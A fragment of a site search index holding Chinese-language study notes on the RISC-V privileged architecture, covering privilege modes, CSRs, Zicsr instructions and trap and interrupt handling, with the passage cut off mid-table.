stvec\u3001sip\u3001sie\u3001sepc\u3001scause\u3001stval \u610f\u4e49\u5747\u4e0e M \u6a21\u5f0f\u7c7b\u4f3c\u3002 S \u6a21\u5f0f\u7279\u6743\u6307\u4ee4 \u00b6 ecall I \u578b 31 20 19 15 14 12 11 7 6 0 000000000000 00000 000 00000 1110011 \u6307\u4ee4\u683c\u5f0f \uff1aecall \u6307\u4ee4\u4f5c\u7528 \uff1aS \u6a21\u5f0f\u8c03\u7528 ecall \u4f1a\u4ea7\u751f environment-call-from-S-mode \u5f02\u5e38 \u6ce8\u610f \uff1a\u63a5\u6536\u7279\u6743\u7ea7\u7684 epc \u5bc4\u5b58\u5668\u8981\u8bbe\u7f6e\u4e3a ecall \u6307\u4ee4\u7684\u5730\u5740\uff0c\u800c\u4e0d\u662f ecall \u6307\u4ee4\u7684\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740 ebreak I \u578b 31 20 19 15 14 12 11 7 6 0 000000000001 00000 000 00000 1110011 \u6307\u4ee4\u683c\u5f0f \uff1aebreak \u6307\u4ee4\u4f5c\u7528 \uff1a\u4efb\u4f55\u6a21\u5f0f\u8c03\u7528 ebreak \u90fd\u4f1a\u4ea7\u751f breakpoint \u5f02\u5e38\uff0c\u5c06\u63a7\u5236\u6d41\u4ea4\u7ed9\u8c03\u8bd5\u5668 \u6ce8\u610f \uff1a\u63a5\u6536\u7279\u6743\u7ea7\u7684 epc \u5bc4\u5b58\u5668\u8981\u8bbe\u7f6e\u4e3a ebreak \u6307\u4ee4\u7684\u5730\u5740\uff0c\u800c\u4e0d\u662f ebreak \u6307\u4ee4\u7684\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740 sret I \u578b 31 20 19 15 14 12 11 7 6 0 000100000010 00000 000 00000 1110011 \u6307\u4ee4\u683c\u5f0f \uff1asret \u6307\u4ee4\u4f5c\u7528 \uff1a\u5728 S \u6a21\u5f0f\u5904\u7406 trap \u4e4b\u540e\u8fd4\u56de\u524d\u4e00\u7279\u6743\u6a21\u5f0f\uff0c\u5e76\u5c06 pc \u8bbe\u7f6e\u4e3a sepc \u5bc4\u5b58\u5668\u7684\u503c \u5c06\u5f53\u524d\u7279\u6743\u6a21\u5f0f\u8bbe\u7f6e\u4e3a sstatus[SPP] \u5c06 sstatus[SIE] \u8bbe\u7f6e\u4e3a sstatus[SPIE] \u5c06 sstatus[SPIE] \u8bbe\u7f6e\u4e3a 1 \u5c06 sstatus[SPP] \u8bbe\u7f6e\u4e3a U \u5c06 pc \u8bbe\u7f6e\u4e3a sepc \u5bc4\u5b58\u5668\u7684\u503c wfi I \u578b 31 20 19 15 14 12 11 7 6 0 000100000101 00000 000 00000 1110011 \u6307\u4ee4\u683c\u5f0f \uff1awfi \u6307\u4ee4\u4f5c\u7528 \uff1a\u4efb\u4f55\u7279\u6743\u6a21\u5f0f\u5747\u53ef\u7528\uff0c\u6267\u884c\u65f6\u5f53\u524d hart \u4f1a\u8fdb\u5165\u4f11\u7720\uff0c\u7b49\u5f85\u4e2d\u65ad\u6765\u5524\u9192\uff0c\u76f8\u5f53\u4e8e nop RISC-V \u4e2d\u65ad\u548c\u5f02\u5e38\u5904\u7406 \u00b6 RISC-V \u5c06\u80fd\u5f15\u8d77\u5f53\u524d\u7a0b\u5e8f\u4e2d\u65ad\uff0c\u4f7f CPU \u8f6c\u5230\u7279\u5b9a\u4ee3\u7801\u7684\u4e8b\u4ef6\u79f0\u4e3a \u9677\u9631\uff08Trap\uff09 \uff0c\u5176\u5206\u4e3a\u4e24\u7c7b\uff0c \u4e2d\u65ad\uff08Interrupt\uff09 \u548c \u5f02\u5e38\uff08Exception\uff09 \uff1a \u4e2d\u65ad\u662f\u786c\u4ef6\u4ea7\u751f\u7684\uff0c\u5f02\u6b65\u5904\u7406\uff0c\u662f\u6b63\u5e38\u4e8b\u4ef6\u3002\u5305\u62ec\u8f6f\u4ef6\u4e2d\u65ad\u3001\u65f6\u949f\u4e2d\u65ad\u3001\u5916\u90e8\u4e2d\u65ad\u7b49\u3002 \u5f02\u5e38\u662f\u8f6f\u4ef6\u4ea7\u751f\u7684\uff0c\u540c\u6b65\u5904\u7406\uff0c\u662f\u975e\u6b63\u5e38\u4e8b\u4ef6\uff0c\u53ef\u80fd\u4f1a\u5bfc\u81f4\u7a0b\u5e8f\u7ec8\u6b62\u3002\u4f8b\u5982\u6307\u4ee4\u5f02\u5e38\u7b49\u3002 \u4e2d\u65ad\u5904\u7406 \u00b6 RISC-V \u4e2d\u5916\u90e8\u4e2d\u65ad\u5fc5\u987b\u901a\u8fc7 CSR \u6765\u5f00\u542f\uff0c\u5f00\u542f\u4e2d\u65ad\u7531\u4e24\u4e2a\u6b65\u9aa4\uff1a mstatus[MIE] \u662f\u5168\u5c40\u4e2d\u65ad\u4f7f\u80fd\u4f4d\uff0c\u8bbe\u7f6e\u4e3a 1 \u624d\u4f1a\u5168\u5c40\u5f00\u542f\u4e2d\u65ad mie \u5bc4\u5b58\u5668\u4e2d\u662f\u9488\u5bf9\u5404\u79cd\u4e2d\u65ad\u7c7b\u578b\u7684\u4f7f\u80fd\u4f4d\uff0c\u8981\u5c06\u9700\u8981\u7684\u4f4d\u8bbe\u7f6e\u4e3a 1 \u4e2d\u65ad\u54cd\u5e94\u7a0b\u5e8f\u7684\u5165\u53e3\u5730\u5740\u7531 mtvec \u5bc4\u5b58\u5668\u6307\u5b9a\uff0c\u5982\u524d\u9762\u5199\u5230\u7684\uff0c\u5b83\u5206\u4e3a\u4e24\u79cd\u6a21\u5f0f\uff1a \u76f4\u63a5\u6a21\u5f0f\uff08Direct\uff09\uff0c\u6240\u6709 trap \u90fd\u8df3\u8f6c\u5230 mtvec \u5bc4\u5b58\u5668\u6307\u5b9a\u7684\u5730\u5740\u8fdb\u884c\u5904\u7406 \u5411\u91cf\u5316\u6a21\u5f0f\uff08Vectored\uff09\uff0c\u4e2d\u65ad\u5c06\u6839\u636e\u4e2d\u65ad\u7c7b\u578b\u8df3\u8f6c\u5230\u4e0d\u540c\u504f\u79fb\u4f4d\u7f6e\u7684\u4e2d\u65ad\u54cd\u5e94\u7a0b\u5e8f\uff0c\u5f02\u5e38\u4ecd\u4f7f\u7528\u540c\u4e00\u4e2a\u54cd\u5e94\u7a0b\u5e8f \u5f53\u4e2d\u65ad\u53d1\u751f\u65f6\uff0cCPU \u4f1a\uff1a \u5c06\u53d1\u751f\u5f02\u5e38\u7684\u6307\u4ee4\uff08\u6216\u4e0b\u4e00\u6761\u6307\u4ee4\uff09\u7684\u5730\u5740\u4fdd\u5b58\u5230 mepc \u5bc4\u5b58\u5668 \u5c06\u4e2d\u65ad\u7c7b\u578b\u7801\u4fdd\u5b58\u5230 mcause \u5bc4\u5b58\u5668 \u5982\u679c\u4e2d\u65ad\u5e26\u6709\u9644\u52a0\u4fe1\u606f\uff0c\u5c06\u5176\u4fdd\u5b58\u5230 mtval \u5bc4\u5b58\u5668 \u5982\u679c\u662f\u5916\u90e8\u5f15\u53d1\u7684\u4e2d\u65ad\uff0c\u4ee4 mstatus[MPIE] = mstatus[MIE]\uff08\u4fdd\u5b58\uff09\uff0c\u7136\u540e\u4ee4 mstatus[MIE] = 0\uff08\u5173\u95ed\u4e2d\u65ad\uff09 \u5c06\u5f53\u524d\u7279\u6743\u6a21\u5f0f\u4fdd\u5b58\u5230 mstatus[MPP] \u4e2d \u5c06\u5f53\u524d\u7279\u6743\u6a21\u5f0f\u8bbe\u7f6e\u4e3a Machine \u6a21\u5f0f \u6839\u636e mtvec \u5bc4\u5b58\u5668\u7684\u8bbe\u7f6e\uff0c\u8df3\u8f6c\u5230\u5bf9\u5e94\u4e2d\u65ad\u54cd\u5e94\u7a0b\u5e8f \u4e2d\u65ad\u5904\u7406\u7ed3\u675f\u540e\u8981\u4f7f\u7528 mret \u6307\u4ee4\u8fdb\u884c\u8fd4\u56de\uff0c\u5b83\u4f1a\uff1a \u4ee4 mstatus[MIE] = mstatus[MPIE]\uff08\u6062\u590d\uff09\uff0c\u7136\u540e\u4ee4 mstatus[MPIE] = 1 \u5c06\u5f53\u524d\u7279\u6743\u6a21\u5f0f\u8bbe\u7f6e\u4e3a mstatus[MPP] \u4e2d\u4fdd\u5b58\u7684\u503c \u5c06 mstatus[MPP] \u8bbe\u7f6e\u4e3a U \u6a21\u5f0f \u5c06 pc \u503c\u8bbe\u7f6e\u4e3a mepc \u503c\uff0c\u5373\u8df3\u8f6c\u56de\u4e2d\u65ad\u524d\u7684\u7a0b\u5e8f \u59d4\u6258\u5904\u7406 \u00b6 RISC-V \u4e2d\uff0c\u6240\u6709\u4e2d\u65ad\u90fd\u4f1a\u5728 Machine \u6a21\u5f0f\u4e0b\u8fdb\u884c\u5904\u7406\u3002\u5728\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u4e2d\u65ad\u901a\u5e38\u662f\u8981\u4ea4\u7ed9\u5185\u6838\u6765\u5904\u7406\u7684\uff0c\u5185\u6838\u6001\u5bf9\u5e94\u7684\u4e5f\u5c31\u662f Supervisor \u6a21\u5f0f\u3002RISC-V \u4e2d\u63d0\u4f9b\u4e86\u59d4\u6258\u673a\u5236\uff0c\u53ef\u4ee5\u5c06\u4e2d\u65ad\u76f4\u63a5\u59d4\u6258\u7ed9 Supervisor \u6a21\u5f0f\u5904\u7406\uff0c\u800c\u4e0d\u7ecf\u8fc7 Machine \u6a21\u5f0f\u3002 \u76f8\u5173\u7684\u59d4\u6258\u8bbe\u7f6e\u5728 medeleg \u548c mideleg \u4e24\u4e2a\u5bc4\u5b58\u5668\u4e2d\uff0c\u76f8\u5173\u610f\u4e49\u5728\u524d\u9762 Machine-Level CSR \u90e8\u5206\u5199\u8fc7\u4e86\u3002 \u5728\u59d4\u6258\u60c5\u51b5\u4e0b\uff0c\u548c\u4e0a\u9762\u4e0d\u540c\u7684\u662f\u5c06\u4f1a\u4f7f\u7528 Supervisor-Level \u7684 CSR\uff0c\u5982 sepc\u3001scause\u3001stval \u7b49\uff0c\u800c\u4e14\u4e5f\u4f1a\u4f7f\u7528 sret \u8fdb\u884c\u4e2d\u65ad\u8fd4\u56de\u3002","title":"RISC-V \u7279\u6743\u7ea7 ISA"},{"location":"cs/pl/riscv/privileged/#risc-v-isa","text":"Abstract RISC-V \u6307\u4ee4\u96c6\u7684\u7279\u6743\u7ea7\u90e8\u5206\u3002 \u53c2\u8003\uff1a The RISC-V Instruction Set Manual Volume II: Privileged Architecture v.20211203 \u6d59\u6c5f\u5927\u5b66 \u201c\u8ba1\u7b97\u673a\u7cfb\u7edf \u2161 \u201c\uff08\u5927\u4e8c\u79cb\u51ac\uff09\u8bfe\u7a0b","title":"RISC-V \u7279\u6743\u7ea7 ISA"},{"location":"cs/pl/riscv/privileged/#_1","text":"RISC-V \u6307\u4ee4\u96c6\u6709\u4e09\u79cd\u7279\u6743\u6a21\u5f0f\uff0c\u5206\u522b\u662f Machine\uff08M\uff09\u3001Supervisor\uff08S\uff09\u548c User\uff08U\uff09\uff0c\u9664\u6b64\u4e4b\u5916\u8fd8\u6709 Hypervisor\uff08H\uff09\u6a21\u5f0f\uff0c\u4e0d\u8fc7\u8c8c\u4f3c\u4e0d\u5e38\u7528\u3002 \u7b49\u7ea7 \u7f16\u7801 \u540d\u79f0 \u7f29\u5199 0 00 User/Application U 1 01 Supervisor S 2 10 Hypervisor H 3 11 Machine M M \u6a21\u5f0f\u662f\u5bf9\u786c\u4ef6\u64cd\u4f5c\u7684\u62bd\u8c61\uff0c\u6709\u6700\u9ad8\u7ea7\u522b\u7684\u6743\u9650\u3002 S \u6a21\u5f0f\u4ecb\u4e8eM\u6a21\u5f0f\u548cU\u6a21\u5f0f\u4e4b\u95f4\uff0c\u5728\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u5bf9\u5e94\u4e8e\u5185\u6838\u6001\uff08Kernel\uff09\u3002\u5f53\u7528\u6237\u9700\u8981\u5185\u6838\u8d44\u6e90\u65f6\uff0c\u5411\u5185\u6838\u7533\u8bf7\uff0c\u5e76\u5207\u6362\u5230\u5185\u6838\u6001\u8fdb\u884c\u5904\u7406\u3002 U \u6a21\u5f0f\u7528\u4e8e\u6267\u884c\u7528\u6237\u7a0b\u5e8f\uff0c\u5728\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u5bf9\u5e94\u4e8e\u7528\u6237\u6001\uff0c\u6709\u6700\u4f4e\u7ea7\u522b\u7684\u6743\u9650\u3002 \u7b80\u5355\u5d4c\u5165\u5f0f\u7cfb\u7edf\u5e94\u8be5\u81f3\u5c11\u6709 M \u6a21\u5f0f\uff0c\u5b89\u5168\u7684\u5d4c\u5165\u5f0f\u7cfb\u7edf\u81f3\u5c11\u8981\u6709 M\u3001U \u4e24\u4e2a\u6a21\u5f0f\uff0cUnix-like \u64cd\u4f5c\u7cfb\u7edf\u81f3\u5c11\u8981\u6709 M\u3001S\u3001U \u4e09\u4e2a\u6a21\u5f0f\u3002 \u7279\u6743\u6a21\u5f0f\u7528\u6765\u5206\u79bb\u3001\u4fdd\u62a4\u4e0d\u540c\u7684\u8fd0\u884c\u73af\u5883\u3002\u8bd5\u56fe\u5728\u4f4e\u7279\u6743\u6a21\u5f0f\u4e0b\u6267\u884c\u9ad8\u7279\u6743\u6a21\u5f0f\u7684\u6307\u4ee4\u4f1a\u5bfc\u81f4\u5f02\u5e38\u3002 \u4e00\u4e2a hart\uff08RISC-V hardware thread\uff0c\u6307 RISC-V \u5904\u7406\u5668\u7684\u4e00\u4e2a\u6267\u884c\u5355\u5143\uff09\u4e00\u822c\u5728 U \u6a21\u5f0f\u4e0b\u8fd0\u884c\u5e94\u7528\u7a0b\u5e8f\uff0c\u76f4\u5230\u9047\u5230 trap\uff08\u6bd4\u5982\u7cfb\u7edf\u8c03\u7528\u3001\u65f6\u95f4\u4e2d\u65ad\u7b49\uff09\uff0c\u8fd9\u65f6 hart \u4f1a\u5207\u6362\u5230\u66f4\u9ad8\u7279\u6743\u7ea7\u7684 trap handler\uff0c\u6267\u884c\u5b8c\u540e\u518d\u5207\u6362\u56de\u4f4e\u6743\u9650\u6a21\u5f0f\u7ee7\u7eed\u6267\u884c\u3002 \u9664\u6b64\u4e4b\u5916\uff0cRISC-V \u8fd8\u89c4\u5b9a\u4e86 Debug mode\uff08D-mode\uff09\uff0c\u7528\u4e8e\u8c03\u8bd5\uff0c\u5b83\u6bd4 M \u6a21\u5f0f\u6709\u66f4\u9ad8\u7684\u6743\u9650\uff0c\u6709\u4e00\u4e9b\u53ea\u6709 D \u6a21\u5f0f\u624d\u53ef\u4ee5\u8bbf\u95ee\u7684 CSR \u5bc4\u5b58\u5668\uff0c\u4e5f\u4f1a\u4fdd\u7559\u4e00\u4e9b\u7269\u7406\u5730\u5740\u7a7a\u95f4\u3002","title":"\u7279\u6743\u6a21\u5f0f"},{"location":"cs/pl/riscv/privileged/#csrs","text":"CSR \u662f RISC-V CPU \u4e2d\u7684\u4e00\u7cfb\u5217\u7279\u6b8a\u5bc4\u5b58\u5668\uff0c\u80fd\u591f\u53cd\u6620\u548c\u63a7\u5236 CPU \u5f53\u524d\u7684\u72b6\u6001\u548c\u6267\u884c\u673a\u5236\u3002 RISC-V \u7ed9 CSR \u5206\u914d\u4e86 12 \u4f4d\u7684\u5730\u5740\u7a7a\u95f4\uff08csr[11:0])\uff0c\u53ef\u4ee5\u5bb9\u7eb3\u6700\u591a 4096 \u4e2a CSR\uff0c\u5176\u4e2d csr[11:10] \u8868\u793a\u5bc4\u5b58\u5668\u7684\u8bfb\u5199\u6743\u9650\uff0800/01/10 \u5747\u8868\u793a\u53ef\u8bfb\u53ef\u5199\uff0c11 \u8868\u793a\u53ea\u8bfb\uff09\uff0ccsr[9:8] \u8868\u793a\u53ef\u4ee5\u8bbf\u95ee\u8be5\u5bc4\u5b58\u5668\u7684\u6700\u4f4e\u7279\u6743\u7ea7\u3002\u76f8\u5173\u6743\u9650\u4e00\u822c\u8868\u793a\u4e3a\u4e09\u4f4d\u5b57\u6bcd\uff0c\u7b2c\u4e00\u4e2a\u5b57\u6bcd\u8868\u793a\u6700\u4f4e\u7279\u6743\u7ea7\uff0c\u540e\u4e24\u4e2a\u5b57\u6bcd\u8868\u793a\u8bfb\u5199\u6743\u9650\uff08RW/RO\uff09\u3002 \u8bbf\u95ee\u4e0d\u5b58\u5728\u7684 CSR \u4f1a\u5bfc\u81f4 illegal instruction exception\uff0c\u8bbf\u95ee\u66f4\u9ad8\u7ea7\u7684 CSR\u3001\u6216\u8005\u5199\u5165\u53ea\u8bfb CSR \u4e5f\u4f1a\u5bfc\u81f4\u8be5\u5f02\u5e38\u3002\u4e00\u4e2a\u53ef\u8bfb\u53ef\u5199\u7684\u5bc4\u5b58\u5668\u4e5f\u53ef\u80fd\u4f1a\u6709\u53ea\u8bfb\u7684\u4f4d\uff0c\u4f46\u8fd9\u65f6\u5199\u5165\u53ea\u8bfb\u4f4d\u4f1a\u88ab\u5ffd\u7565\uff08\u800c\u4e0d\u4f1a\u5bfc\u81f4\u5f02\u5e38\uff09\u3002 CSR \u8fd8\u5206\u6709\u6807\u51c6\u548c\u975e\u6807\u51c6\u4e24\u7c7b\uff08Standard/Custom\uff09\uff0c\u5176\u4e2d Custom CSR \u5728\u672a\u6765\u6807\u51c6\u4e2d\u4e5f\u4e0d\u4f1a\u88ab\u5360\u7528\u3002\u5b83\u4eec\u662f\uff1a 0x800~0x8FF (1000 xxxx) URW\u30010xCC0~0xCFF (1100 11xx) URO 0x5C0~0x5FF (0101 11xx) SRW\u30010x9C0~0x9FF (1001 11xx) SRW\u30010xDC0~0xDFF (1101 11xx) SRO 0x6C0-0x6FF (0110 11xx) HRW\u30010xAC0-0xAFF (1010 11xx) HRW\u30010xEC0-0xEFF (1110 11xx) HRO 0x7C0-0x7FF (0111 11xx) MRW\u30010xBC0-0xBFF (1011 11xx) MRW\u30010xFC0-0xFFF (1111 11xx) MRO \u9488\u5bf9 D \u6a21\u5f0f\u6709\u4e00\u4e9b\u4fdd\u7559\u7684 CSR\uff0c0x7A0~0x7AF \u662f M \u6a21\u5f0f\u53ef\u4ee5\u8bbf\u95ee\u7684\u8bfb\u5199 CSR\uff0c0x7B0~0x7BF \u662f\u53ea\u6709 D \u6a21\u5f0f\u53ef\u4ee5\u8bbf\u95ee\u7684\u8bfb\u5199 CSR\u3002","title":"\u63a7\u5236\u548c\u72b6\u6001\u5bc4\u5b58\u5668\uff08CSRs\uff09"},{"location":"cs/pl/riscv/privileged/#csr-zicsr","text":"Zicsr \u6269\u5c55\u4e2d\u89c4\u5b9a\u4e86\u4e00\u7cfb\u5217\u5173\u4e8e\u8bbf\u95ee CSR \u7684\u6307\u4ee4\uff0c\u4f7f\u7528\u7279\u6743\u7ea7\u7684\u8bdd\u4e00\u5b9a\u8981\u5b9e\u73b0\u8be5\u6269\u5c55\u3002 CSR \u6307\u4ee4\u90fd\u4f7f\u7528 I \u578b\u6307\u4ee4\uff0c\u5176\u4e2d 12 \u4f4d\u7684\u7acb\u5373\u6570\u90e8\u5206\u8868\u793a CSR \u7684\u5730\u5740\uff0cfunct3 \u4f4e 2 \u4f4d\u7528\u6765\u7f16\u7801\u8bfb/\u6539/\u5199\uff08read-modify-write\uff09\u64cd\u4f5c\u3001\u9ad8 1 \u4f4d\u8868\u793a\u662f\u5426\u6765\u81ea\u7acb\u5373\u6570\uff08\u5982\u679c\u6765\u81ea\u7acb\u5373\u6570\u5219 rs1 \u90e8\u5206\u8868\u793a\u4e00\u4e2a 5 \u4f4d\u65e0\u7b26\u53f7\u7acb\u5373\u6570\uff09\uff0copcode \u90fd\u662f SYSTEM\uff081110011\uff09\u3002 csrrw I \u578b 31 20 19 15 14 12 11 7 6 0 csr rs1 001 rd 1110011 \u6307\u4ee4\u683c\u5f0f \uff1acsrrw rd, csr, rs1 \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06\u6307\u5b9a csr \u503c\u5b58\u5165 rd\uff0c\u5c06 rs1 \u503c\u5b58\u5165 csr \u6ce8\u610f \uff1a\u5982\u679c rd \u4e3a x0\uff0c\u5219\u4e0d\u4f1a\u8bfb\u53d6\u539f csr\uff08\u4e5f\u4e0d\u4f1a\u9020\u6210\u4efb\u4f55\u8bfb\u7684\u526f\u4f5c\u7528\uff09 csrrs I \u578b 31 20 19 15 14 12 11 7 6 0 csr rs1 010 rd 1110011 \u6307\u4ee4\u683c\u5f0f \uff1acsrrs rd, csr, rs1 \u6307\u4ee4\u4f5c\u7528 \uff1a\u8bfb\u53d6 csr \u539f\u503c\u5230 rd\uff0c\u5c06 rs1 \u503c\u4e0e csr \u8fdb\u884c\u6309\u4f4d\u6216\u8fd0\u7b97\u540e\u5b58\u5165 csr \u6ce8\u610f \uff1a\u5982\u679c rs1 \u4e3a x0\uff0c\u5219\u4e0d\u4f1a\u5199\u5165 csr\uff08\u4f46\u4e00\u5b9a\u4f1a\u8bfb\uff09\uff0c\u5982\u679c\u67d0\u4f4d\u4e0d\u53ef\u5199\u5219\u5ffd\u7565\u8be5\u4f4d csrrc I \u578b 31 20 19 15 14 12 11 7 6 0 csr rs1 011 rd 1110011 \u6307\u4ee4\u683c\u5f0f \uff1acsrrc rd, csr, rs1 \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 csr \u539f\u503c\u5b58\u5165 rd\uff0c\u5c06 rs1 \u4e2d\u4e3a 1 \u7684\u4f4d\u5728 csr \u4e2d\u5bf9\u5e94\u4f4d\u7f6e 0 \u6ce8\u610f \uff1a\u5982\u679c rs1 \u4e3a x0\uff0c\u5219\u4e0d\u4f1a\u5199\u5165 csr\uff08\u4f46\u4e00\u5b9a\u4f1a\u8bfb\uff09\uff0c\u5982\u679c\u67d0\u4f4d\u4e0d\u53ef\u5199\u5219\u5ffd\u7565\u8be5\u4f4d csrrwi I \u578b 31 20 19 15 14 12 11 7 6 0 csr uimm 101 rd 1110011 \u6307\u4ee4\u683c\u5f0f \uff1acsrrwi rd, csr, uimm \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06\u6307\u5b9a csr \u503c\u5b58\u5165 rd\uff0c\u5c06 uimm \u7684\u503c\u96f6\u6269\u5c55\u5230 32/64 \u4f4d\u540e\u5b58\u5165 csr \u6ce8\u610f \uff1a\u5982\u679c rd \u4e3a x0\uff0c\u5219\u4e0d\u4f1a\u8bfb\u53d6\u539f csr csrrsi I \u578b 31 20 19 15 14 12 11 7 6 0 csr uimm 110 rd 1110011 \u6307\u4ee4\u683c\u5f0f \uff1acsrrs rd, csr, uimm \u6307\u4ee4\u4f5c\u7528 \uff1a\u8bfb\u53d6 csr \u539f\u503c\u5230 rd\uff0c\u5c06 uimm \u7684\u503c\u96f6\u6269\u5c55\u5230 32/64 \u4f4d\u540e\u5b58\u5165 csr \u6ce8\u610f \uff1a\u5982\u679c uimm \u4e3a 0\uff0c\u5219\u4e0d\u4f1a\u5199\u5165 csr\uff08\u4f46\u4e00\u5b9a\u4f1a\u8bfb\uff09\uff0c\u5982\u679c\u67d0\u4f4d\u4e0d\u53ef\u5199\u5219\u5ffd\u7565\u8be5\u4f4d csrrci I \u578b 31 20 19 15 14 12 11 7 6 0 csr uimm 111 rd 1110011 \u6307\u4ee4\u683c\u5f0f \uff1acsrrc rd, csr, uimm \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 csr \u539f\u503c\u5b58\u5165 rd\uff0c\u5c06 uimm \u7684\u503c\u96f6\u6269\u5c55\u5230 32/64 \u4f4d\u540e\u4e3a 1 \u7684\u4f4d\u5728 csr \u4e2d\u5bf9\u5e94\u4f4d\u7f6e 0 \u6ce8\u610f \uff1a\u5982\u679c uimm \u4e3a 0\uff0c\u5219\u4e0d\u4f1a\u5199\u5165 csr\uff08\u4f46\u4e00\u5b9a\u4f1a\u8bfb\uff09\uff0c\u5982\u679c\u67d0\u4f4d\u4e0d\u53ef\u5199\u5219\u5ffd\u7565\u8be5\u4f4d","title":"CSR \u6307\u4ee4\uff08Zicsr \u6269\u5c55\uff09"},{"location":"cs/pl/riscv/privileged/#_2","text":"\u4e00\u4e9b\u53ea\u8bfb/\u53ea\u5199\u7684\u6c47\u7f16\u7b80\u5316\u5199\u6cd5\uff1a \u4f2a\u4ee3\u7801 \u539f\u6307\u4ee4 csrr rd, csr csrrs rd, csr, x0 csrw csr, rs1 csrrw x0, csr, rs1 csrwi csr, uimm csrrwi x0, csr, uimm csrs csr, rs1 csrrs x0, csr, rs1 csrsi csr, uimm csrrsi x0, csr, uimm csrc csr, rs1 csrrc x0, csr, rs1 csrci csr, uimm csrrci x0, csr, uimm","title":"\u6c47\u7f16\u4f2a\u4ee3\u7801"},{"location":"cs/pl/riscv/privileged/#csr","text":"Hypervisor/Debug \u6a21\u5f0f\u7565\u8fc7\u4e86\u3002","title":"\u5df2\u5206\u914d\u7684 CSR"},{"location":"cs/pl/riscv/privileged/#user","text":"\u7f16\u53f7 \u6743\u9650 \u540d\u79f0 \u8bf4\u660e 0x001 URW fflags \u6d6e\u70b9\u5f02\u5e38\u6807\u5fd7 0x002 URW frm \u6d6e\u70b9\u820d\u5165\u6a21\u5f0f 0x003 URW fcsr \u6d6e\u70b9\u63a7\u5236\u5bc4\u5b58\u5668 0xC00 URO cycle \u65f6\u949f\u5468\u671f\u8ba1\u6570\u5668\uff08rdcycle \u6307\u4ee4\u8bfb\u53d6\uff09 0xC01 URO time \u8ba1\u65f6\u5668\uff08rdtime \u6307\u4ee4\u8bfb\u53d6\uff09 0xC02 URO instret \u6307\u4ee4\u8ba1\u6570\u5668\uff08rdinstret \u6307\u4ee4\u8bfb\u53d6\uff09 0xC03-0xC1F URO hpmcounter3-31 \u6027\u80fd\u8ba1\u6570\u5668 0xC80 URO cycleh \u65f6\u949f\u5468\u671f\u8ba1\u6570\u5668\u9ad8 32 \u4f4d\uff08\u53ea\u6709 RV32 \u6709\uff09 0xC81 URO timeh \u8ba1\u65f6\u5668\u9ad8 32 \u4f4d\uff08\u53ea\u6709 RV32 \u6709\uff09 0xC82 URO instreth \u6307\u4ee4\u8ba1\u6570\u5668\u9ad8 32 \u4f4d\uff08\u53ea\u6709 RV32 \u6709\uff09 0xC83-0xC9F URO hpmcounter3h-31h \u6027\u80fd\u8ba1\u6570\u5668\u9ad8 32 \u4f4d\uff08\u53ea\u6709 RV32 \u6709\uff09","title":"\u975e\u7279\u6743\u7ea7 / User \u6a21\u5f0f"},{"location":"cs/pl/riscv/privileged/#supervisor","text":"\u7f16\u53f7 \u6743\u9650 \u540d\u79f0 \u8bf4\u660e 0x100 SRW sstatus Supervisor \u72b6\u6001\u5bc4\u5b58\u5668 0x104 SRW sie Supervisor \u4e2d\u65ad\u4f7f\u80fd\u5bc4\u5b58\u5668 0x105 SRW stvec Supervisor \u4e2d\u65ad\u5411\u91cf\u5bc4\u5b58\u5668 0x106 SRW scounteren Supervisor \u6027\u80fd\u8ba1\u6570\u5668\u4f7f\u80fd\u5bc4\u5b58\u5668 0x10A SRW senvcfg Supervisor \u73af\u5883\u914d\u7f6e\u5bc4\u5b58\u5668 0x140 SRW sscratch Supervisor trap handler \u4e34\u65f6\u5bc4\u5b58\u5668 0x141 SRW sepc Supervisor exception pc \u5bc4\u5b58\u5668 0x142 SRW scause Supervisor trap \u539f\u56e0\u5bc4\u5b58\u5668 0x143 SRW stval Supervisor trap \u503c\u5bc4\u5b58\u5668 0x144 SRW sip Supervisor \u4e2d\u65ad\u6302\u8d77\u5bc4\u5b58\u5668 0x180 SRW satp Supervisor \u5730\u5740\u7ffb\u8bd1\u5bc4\u5b58\u5668 0x5A8 SRW scontext Supervisor \u6a21\u5f0f\u4e0a\u4e0b\u6587\u5bc4\u5b58\u5668","title":"Supervisor \u6a21\u5f0f"},{"location":"cs/pl/riscv/privileged/#machine","text":"Machine \u4fe1\u606f\u5bc4\u5b58\u5668 \u7f16\u53f7 \u6743\u9650 \u540d\u79f0 \u8bf4\u660e 0xF11 MRO mvendorid Machine \u5382\u5546 ID 0xF12 MRO marchid Machine \u67b6\u6784 ID 0xF13 MRO mimpid Machine \u5b9e\u73b0 ID 0xF14 MRO mhartid Machine hart ID 0xF15 MRO mconfigptr Machine \u914d\u7f6e\u6570\u636e\u7ed3\u6784\u4f53\u6307\u9488 Machine trap \u8bbe\u7f6e\u76f8\u5173 \u7f16\u53f7 \u6743\u9650 \u540d\u79f0 \u8bf4\u660e 0x300 MRW mstatus Machine \u72b6\u6001\u5bc4\u5b58\u5668 0x301 MRW misa Machine ISA \u4e0e\u6269\u5c55\u5bc4\u5b58\u5668 0x302 MRW medeleg Machine \u5f02\u5e38\u59d4\u6258\u5bc4\u5b58\u5668 0x303 MRW mideleg Machine \u4e2d\u65ad\u59d4\u6258\u5bc4\u5b58\u5668 0x304 MRW mie Machine \u4e2d\u65ad\u4f7f\u80fd\u5bc4\u5b58\u5668 0x305 MRW mtvec Machine \u4e2d\u65ad\u5411\u91cf\u5bc4\u5b58\u5668 0x306 MRW mcounteren Machine \u6027\u80fd\u8ba1\u6570\u5668\u4f7f\u80fd\u5bc4\u5b58\u5668 0x310 MRW mstatush Machine \u72b6\u6001\u5bc4\u5b58\u5668\u9644\u52a0\u90e8\u5206\uff08\u53ea\u6709 RV32 \u6709\uff09 Machine trap \u5904\u7406\u76f8\u5173 \u7f16\u53f7 \u6743\u9650 \u540d\u79f0 \u8bf4\u660e 0x340 MRW mscratch Machine trap handler \u4e34\u65f6\u5bc4\u5b58\u5668 0x341 MRW mepc Machine exception pc \u5bc4\u5b58\u5668 0x342 MRW mcause Machine trap \u539f\u56e0\u5bc4\u5b58\u5668 0x343 MRW mtval Machine trap \u503c\u5bc4\u5b58\u5668 0x344 MRW 